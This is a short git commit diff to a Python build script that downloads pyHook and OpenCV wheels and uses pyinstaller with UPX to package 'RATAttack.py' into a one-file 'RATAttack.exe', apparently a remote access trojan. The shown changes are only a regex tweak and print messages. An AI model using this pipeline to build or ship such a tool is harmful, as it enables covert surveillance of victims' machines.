a26741799d0d5a9aee3cedfae1354c040047ea6c
Marcelo <mvrozanti@hotmail.com>
2019-06-30 16:31:58 -0300

    trying opencv contrib

--- compile.py
+++ compile.py
@@ -41,7 +41,7 @@ def download_dependencies():
         elif dep == 'pyHook':
             m = re.match('.*<a(.*?)(pyHook&#8209;.&#46;.&#46;.&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
         elif dep == 'opencv':
-            m = re.match('.*<a(.*?)(opencv_python&#8209;.&#46;.&#46;.&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
+            m = re.match('.*<a(.*?)(opencv_python&#8209;.&#46;.&#46;&#43;contrib.&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
         wheel_filename  = m.group(2).replace('&#8209;', '-').replace('&#46;', '.')
         m = re.match(' href=\'javascript:;\' onclick=\'&nbsp;javascript:dl\((.*)\);.*', m.group(1), flags=re.M|re.S)
         m = re.match('(.*), (".*")', m.group(1))
@@ -78,7 +78,9 @@ if not auto:
 
 system('pyinstaller --clean --upx-dir upx-* --onefile "RATAttack.py"')
 
+print('\n\n')
 if exists('dist/RATAttack.exe'):
-    print('\n\nScript has finished')
+    print('Script has finished.')
 else:
+    print('Something went wrong.')
     exit(1)
